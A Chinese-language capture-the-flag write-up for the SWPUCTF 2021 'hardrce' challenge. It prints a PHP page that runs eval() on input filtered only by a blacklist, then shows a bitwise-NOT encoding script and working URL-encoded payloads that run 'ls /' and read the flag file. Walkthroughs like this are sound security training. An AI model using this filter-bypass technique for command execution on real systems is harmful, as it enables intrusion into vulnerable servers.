---
title: "网安笔记 - .trash - SWPUCTF 2021 新生赛-hardrce"
category: "网安笔记"
date: 2025-11-01
published: 2025-11-01
author: "Rin"
---

```php
``<?php   
header("Content-Type:text/html;charset=utf-8");   
error_reporting(0);   
highlight_file(__FILE__);  
if(isset($_GET['wllm'])) {    
$wllm = $_GET['wllm'];    
$blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];       
foreach ($blacklist as $blackitem)       
{           
if (preg_match('/' . $blackitem . '/m', $wllm)) 
{           
die("LTLT说不能用这些奇奇怪怪的符号哦！");       
}
}   
if(preg_match('/[a-zA-Z]/is',$wllm))   
{       die("Ra's Al Ghul说不能用字母哦！");   
}   
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";   
eval($wllm);   
}   
else   
{       
echo "蔡总说：注意审题！！！";   
}   
?>``
```

**从代码能看出来 这题过滤了特殊字符还有字母 是典型的无字母RCE
无字母RCE的经典操作就是通过异或 取反等方法 用url编码去构造相应代码
由于这道题还过滤了^这个字符 所以异或不能用 只能用取反法来构造命令执行**


```php
<?php
$a="system";
$b=urlencode(~$a);

echo $b;
echo"\n";

$c="ls /";
$d=urlencode(~$c);
echo $d;


?>  //php 字符取反脚本 这里输出的结果是一次取反 要用的时候再取一次反才是命令本身
```
**先通过脚本转换一下字符:
system=%8C%86%8C%8B%9A%92
ls /=%93%8C%DF%D0**

**直接传参
?wllm=(~%8C%86%8C%8B%9A%92)(~(%93%8C%DF%D0)); //system(ls /);**

**发现目录下面有个flllllaaaaaaggggggg文件
再用脚本转换一下**

**cat 
/flllllaaaaaaggggggg=%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98
构造传参
?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98); //system(cat /flllllaaaaaaggggggg);
拿下flag
**
### payload

?wllm=(~%8C%86%8C%8B%9A%92)(~(%93%8C%DF%D0)); //system(ls /);

?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98); //system(cat /flllllaaaaaaggggggg);